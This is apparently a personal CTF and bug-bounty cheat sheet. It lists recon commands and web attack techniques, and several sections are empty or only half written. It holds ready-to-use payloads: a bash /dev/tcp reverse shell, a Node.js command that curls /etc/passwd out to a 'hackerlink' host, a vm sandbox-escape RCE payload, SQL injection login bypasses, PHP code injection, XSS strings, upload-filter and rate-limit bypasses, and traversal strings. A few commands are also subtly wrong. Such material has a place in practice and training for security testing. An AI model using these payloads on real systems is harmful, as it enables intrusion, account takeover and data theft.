# Table of Content
- [Online Practice Ground](#practice)
- [Useful Linux Command](#linux)
- [Useful Reverse Shell](#reverseshell)
- [Reconnaissance](#recon)
   - [Nmap](#nmap)
   - [Nikto](#nikto)
   - [Google Dorking](#googledork)
- [Privilege Escalation](#privesc)
   - [Shell Spawning](#shellspawn)
   - [SUID](#suid)
- [Information Leakage](#infoleak)
- [Logic Flaw](#logicflaw)
   - [Bypassing Rate Limit](#bypassratelimit)
   - [Account takeover using OTP](#acctakeotp)
- [IDOR](#idor)
- [Web App](#webapp)
   - [SQL Injection](#sqlinj)
   - [PHP](#php)
   - [Flask Cookies Forge](#flaskcookie)
   - [XSS](#xss)
   - [Arbitrary File Upload](#AFU)
   - [Symfony](#symfony)
   - [Javascript vuln](#jsrvuln)
   - [XML External Entity (XXE)](#xxe)
   - [Subdomain Takeover](#subdomain)
   - [Path Traversal Vulnerability](#ptv)
- [Reverse Engineering](#re)
   - [Methodology](#remeth)

<a name="practice"></a>
## Online Practice Ground

https://ctf.airgapp.in/
https://tghack.no/
https://ctfd.sharkyctf.xyz
https://covid19.threatsims.com/

<a name="linux"></a>
## Useful Linux Command

- ```ls```: List every file in a directory
- ```ls -al```: List every file in directory with its chmod.
- ```cd [directory]```: Enter a directory
- ```cd ..```: Go back up one directory
- ```cd ~```: go back to home directory
- ```pwd```: current folder
- ```strings [file]``` : Grab human readable strings from a binary file
- ```file [directory] -type f -size 1033c -executable -readable```: Find a human readable file with size 1033, and executable.
- ```chmod +x [file]```: Add executable to file's chmod;
- ```uniq [file1] [file2]```: Find the unique line between two files
- ```base64 -d [file]```: Use base64 to decode text stored in file.
- ```cat [file] | tr 'A-Za-z' 'N-ZA-Mn-za-m'```: Open a file and rot13
- ```xxd [file]```: Read binary data of a file

<a name="recon"></a>
## Reconnaissance

<a name="nmap"></a>
### Nmap

- ```nmap -p- -oA full-nonscripts [Target IP] --max-retries 0```: 
- ```nmap -sC -sV -O -oA [file] [target ip]```:




<a name="nikto"></a>
### Nikto

<a name="googledork"></a>
### Google Dork

To find subdomains of a website:

```
site:[website] -www
```

Try to find secret file of a website:

```
site:[website] intitle:"index of"

```

<a name="reverseshell"></a>
## Useful Reverse Shell

```bash -i >& /dev/tcp/[host]/[port] 0>&1```

<a name ="privesc"></a>
## Privilege Escalation

<a name="shellspawn"></a>
### Shell Spawning 

```python
python -c 'import pty;pty.spawn("/bin/sh")'
```


<a name="suid"></a>
### SUID

To find file with SUID bit. Simply use following command:

```
find [directory] -perm -u=s -type f 2>/dev/null
```

<a name="infoleak"></a>
## Information Leakage
Using Linkfinder to find secret endpoints of a website (Source: https://medium.com/bugbountywriteup/mining-the-web-redefining-the-art-of-hardcoded-data-finds-4fee0c8fd4f7)

Using APIkeyhack to check if any api key works (Source: https://medium.com/bugbountywriteup/mining-the-web-redefining-the-art-of-hardcoded-data-finds-4fee0c8fd4f7)

Use google dork find secret folders.



<a name="logicflaw")</a>
## Logic Flaw

<a name="bypassratelimit"></a>
### Bypassing rate limit
In most app/webapp, a rate limit normally be set for login attempt or something else. To reset the rate limit, simply put %00 after your username or login email. Also, you can add space, %0d , %2e , %09 , %20 behind it. 

Source: https://medium.com/bugbountywriteup/bypassing-rate-limit-like-a-pro-5f3e40250d

You can also try changing user-agent, IP or cookies etc. Or check if there are any ratelimit counting from the request you sent. 

Source: https://medium.com/@huzaifa_tahir/methods-to-bypass-rate-limit-5185e6c67ecd

Another way to bypass rate limit is to use IP rotator extension in Burp Suite. 

Also, brute forcing a fixed password against multiple usernames also one of the issues:

https://ysamm.com/?p=396

<a name="acctakeotp"></a>
### Account Takeover using OTP
For OTP account (i.e. send some specific code to your mobile or email), check few things below:-

1. the OTP is leaked in initial response?
2. the OTP can be used for other account?
3. the OTP can be brute forced?



#### Check reset password token

Sometimes, a reset password token might be easy to exploit. Try check something like. "timestamp", "base64" etc to see any pattern was formed in the reset password token. An example of this is the blog post below:

https://medium.com/bugbountywriteup/how-i-discovered-an-interesting-account-takeover-flaw-18a7fb1e5359

#### Check password reset request
Another way of account takeover is to check every request sent for reset password. For example, if you can see your email appears in the reset password, you can simply change the email id to another email to see if anything happened. An example of this:

https://medium.com/bugbountywriteup/simple-logic-leads-to-account-takeover-63fec69e88b7


<a name="idor"></a>
## IDOR

IDOR mainly means unauthorized access to other users' information.


### Second Order IDOR

Always intercept redirection and test how redirection logic works.

In the post below, it shows some less common IDOR attacks:

https://blog.usejournal.com/a-less-known-attack-vector-second-order-idor-attacks-14468009781a

In the post, it shows one bank web app IDOR. The original web app logic is as per below:

1. After a transaction, user can retrieve its receipt from end point ```/transactions/show_receipt.aspx?id=32423423```
2. The writer of the blog tried to access others' receipt by changing id number. However, it was redirect to error page.

So, it is clear that the logic is: If id is authorized, the web app redirect user to receipt show page. If not, it redirect users to error page.

Attack scenario:

1. Send request to obtain user's own receipt by sending correct id.
2. Intercept the sucess redirection page and hold it.
3. Change id in original request page and hold the redirect page.
4. Forward the success redirection

This occurs because back end only check if the id would return success or fail without further checking.

<a name="webapp"></a>
## Web App 

<a name="sqlinj"></a>
### SQL Injection

#### numberic input
So, imagine if you need to update your profile using a form, the SQL request would be like:

```
UPDATE tablename SET column1 = 12 WHERE userid = 1;
```
As the data in column1 is numeric, you dont have quote on it. Thus, try to put the number in with # like 12#, the whole SQL statement would be like

```
UPDATE tablename SET column1 = 12# WHERE userid = 1;
```

It would comment out the "where" statement. It would result in updating the whole database instead of just userid 1.

#### Login Form 
Normally, a POST request would takes two parameters (i.e. username and password) from the login form. Thus, the SQL command at the backend is look something like this:

```SQL
SELECT * from TABLE where USERNAME='USERNAME' AND PASSWORD = 'PASSWORD';
```
The statement above mainly ask the Database to select the user where the username and password are matched with the one we input to the login form. 

Now, if we put below payload into the username field, 

```SQL
admin' OR 1=1 --
```
the whole SQL statement would becomes this:

```SQL
SELECT * from TABLE where USERNAME='admin' OR 1=1 --AND PASSWORD='PASSWORD';
```
So, now the statement above now turns to select the user where username is admin or 1=1. Please pay attention that ```--``` means comment out the rest of the statement. Thus, it doesnt matter whether you have put in anything to the password field. Now, the database would return the whole list of user from their database. And normally, a session with the first user in the database would be created for us. If the statement above can't log you in, you may also try something like below as SQL syntax might slightly varies in different brands of SQL.

```SQL
admin' OR 1=1 #
admin" OR 1=1 #
admin" OR 1=1 --
```
If above can log you in and you want to login as other users, you may use the statement below:

```SQL
 ' UNION SELECT 1 --
```
Thus, the whole SQL statement would becomes:

```SQL
SELECT * from TABLE where USERNAME='' UNION SELECT 1 --AND PASSWORD='PASSWORD';
```


```SQL
 ' UNION SELECT 1,2 # 
 ' UNION SELECT 1,2,3 # 
```

<a name ="php"></a>
### PHP

#### Reading PHP source code via LFI

If you found a site with URL like ?file=abc.php

Basically, you can read its source code by ?file=php://filter/convert.base64-encode/abc.php.

#### Eval() Function

If eval() function is spotted in source code, it is highly possible that it can be exploited by code injection. eval() function takes string as input and execute the string as php code. So, if you spotted this, you can try this in input:

```
phpinfo();
```
or 
```
<? phpinfo(); ?>
```
If the first code upthere can executed properly, the program is vulnerablet to php code injection without tag. The latter one proved that the system is vulnerable to php code injection with tag.

```
highlight_file('/etc/passwd');
echo passthru('/etc/passwd');
system('whoami');
$a=file_get_content('etc/passwd');print_r($a);


```


<a name ="flaskcookie"></a>
### Flask Cookie Forge

For Flask Web App, there is a very major security risk in its session management if the developer uses its in-built session management function. If you have built a Flask app before, you would be noticed that you need to define something like below in your code:

```python
app.config['SECRET_KEY'] = "secret"
```
The secret key above is used to sign a cookies generated by its session management function. A signed Flask cookies is something like below:-

```
eyxxxxxxxxxxxxxx.xxxxxx.xxxxxxxxx
```
If you found out the webapp has some cookies like this, it is very likely that it is generated by Flask. If you want to further confirm, you can use base64 to decode it. You should able to decode the first part of cookies into a dictionary like below:

```
{'username': 'user', 'login': 'false'}
```

So, it is logical to think that if you can login to true, it might log you in. Thus, your next step is to find out what the secret key is for you to make a manipulated flask cookie to trick the web app server. To do that, you can download an opensource module called "flask-unsign" to help. 

```
pip3 install flask-unsign[wordlist]
```
Then, use below command to find out the secret key:

```
flask-unsign --unisgn -cookie "eyxxxxxxxxxxxxx.xxxx.xxxxxx"
```
This command would brute force and find out the secret key. Once, a secret key is found (e.g. password1), you can sign a new flask cookie with the key and manipluated data. 





<a name = "xss"></a>
### XSS

#### url with utm_source

If found a url with utm_source parameter, it is likely that a reflected xss can be done as utm_source cannot escape easily. An example is as per below:-

```
abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e

is url encoded for

abc`;return+false});});alert`xss`;</script>

which is used like

abc`;                       Finish the string
return+false});      Finish the jQuery click function
});                            Finish the jQuery ready function
alert`xss`;              Here we can execute our code
</script>               This closes the script tag to prevent JavaScript parsing errors
```

#### Html tag only xss
Sometimes, the websites only filters some dangerous input like <script>. But still allows <p>, <h1> those kind of html tag. In this way. following payloads can be used:
   
```
<div onmouseover="alert(1)" style="position:fixed;left:0;top:0;width:9999px;height:9999px;"></div>
```

#### filter not allowing "
Came accross a xss filter that not allows to use ". Thus, <script>alert(1);</script> works. But <script>alert("abc");</script> does not work. Now, below payload can be used to bypass:

```
var x = String(/This contains no quotes/);
x = x.substring(1, x.length-1);
alert(x);
```

#### Script kept pompting "Uncaught SyntaxError: Invalid or unexpected token" in console

To bypass:

```
"}; <script>alert(1);</script> //
```

<a name="AFU"></a>
### Arbitrary File Upload

#### File name to bypass filter

```
Beacon.html%00.pdf (or other extension which is allowed by the service e.g. .jpg)

```

<a name ="symfony"></a>
### Symfony
If the web app uses a php tools called symfony, you can try to access /_profile to access the log.

<a name="jsvuln"></a>
### Javascript Vuln

#### Exploit eval function
In Nodejs module, there is a function called eval. If you suspect that eval is used in backend service, it can be exploited using RCE payload. For example, if a get request return a JSON parameter without "", it is highly likely that the backend was using eval to calculate that parameter. To check, you can put below in your request, it should return current directory (e.g. /app) in its respsonse.

```
process.cwd()
```
If it works, you can try different method using process. to try to exploit the server. Then, you can also add below in request to try to read the directory:

```
var fs=require("fs");fs.readdirSync("/app").toString('utf8')
```
and read the file by:
```
require('fs').readFileSync(<filename>)
```

Also, you can also use child_process.exec to execute some linux command at backend. It looks something like below:

```
require('child_process').exec('curl -F "x=`cat /etc/passwd`" http://hackerlink');
```

#### Exploit vm
If the application backend uses vm as sandboxing, RCE can be run on below payload:

```
const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('ls').toString()
```
The main reason is because the vm was supposed to run some external code inside a sandbox. However, a constructor in Javascript can pointing back to its parent object. In this case, we use constructor twice here and it has been pointing to the main function of the program. Thus, it can execute "ls" in its linux function.

An example of this can be found in one of the redpwnCTF2020's chellenges: Caasino. Below is one of the best writeup I found for this.

https://github.com/saw-your-packet/ctfs/blob/master/redpwnCTF%202020/Write-ups.md#caasino

### Vulnerability of Search Function



<a name = "xxe"></a>
### XML External Entity (XXE)
In web app that 


<a name ="subdomain"></a>
### Subdomain Takeover

<a name ="ptv"></a>
### Path Traversal Vulnerability

#### Checklist
Adding below to the url and see if any return blank page instead of 404.

```
../../../
../\../\../\
/%5c..%5c..%5c/
```

<a name ="re"></a>
# Reverse Engineering

<a name="remeth"></a>
## Methodology
In CTF, once got a Reverser Engineering question, first thing to do is to check readable strings using following command
```
strings [filename]
```

If nothing interesting found, try following to find out what the file type is.

```
file [filename]
```





